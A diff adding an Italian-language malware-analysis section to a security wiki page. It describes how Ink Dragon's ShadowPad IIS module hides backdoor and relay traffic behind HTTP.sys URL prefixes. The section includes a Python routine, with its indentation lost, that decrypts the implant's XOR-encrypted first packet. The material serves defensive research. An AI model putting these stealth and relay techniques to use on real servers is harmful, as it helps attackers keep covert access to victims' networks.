+Il modulo IIS di ShadowPad di Ink Dragon trasforma ogni web server perimetrale compromesso in un doppio **backdoor + relay** legando prefissi URL nascosti direttamente a livello di HTTP.sys:
+
+* **Config defaults** – se la config JSON del modulo omette valori, ricade su valori IIS credibili (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). In questo modo il traffico benigno viene risposto da IIS con il branding corretto.
+* **Wildcard interception** – gli operatori forniscono una lista di prefissi URL separati da punto e virgola (wildcard in host + path). Il modulo chiama `HttpAddUrl` per ogni voce, così HTTP.sys instrada le richieste corrispondenti verso l'handler malevolo *prima* che la richiesta raggiunga i moduli di IIS.
+* **Encrypted first packet** – i primi due byte del body della richiesta contengono il seed per un PRNG personalizzato a 32 bit. Ogni byte successivo viene XOR-ato con il keystream generato prima del parsing del protocollo:
+
+```python
+def decrypt_first_packet(buf):
+seed = buf[0] | (buf[1] << 8)
+num = seed & 0xFFFFFFFF
+out = bytearray(buf)
+for i in range(2, len(out)):
+hi = (num >> 16) & 0xFFFF
+num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
+out[i] ^= num & 0xFF
+return out
+```
+
+* **Relay orchestration** – il modulo mantiene due liste: “servers” (nodi upstream) e “clients” (implant downstream). Le voci vengono rimosse se non arriva alcun heartbeat entro ~30 secondi. Quando entrambe le liste non sono vuote, accoppia il primo server sano con il primo client sano e inoltra semplicemente i byte tra i loro socket finché una delle parti non chiude.
+* **Debug telemetry** – il logging opzionale registra source IP, destination IP e il totale dei byte inoltrati per ogni accoppiamento. Gli investigatori hanno usato quelle tracce per ricostruire la mesh ShadowPad che si estendeva su più vittime.
 
 ---
 
@@ -706,5 +730,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../banners/hacktricks-training.md}}
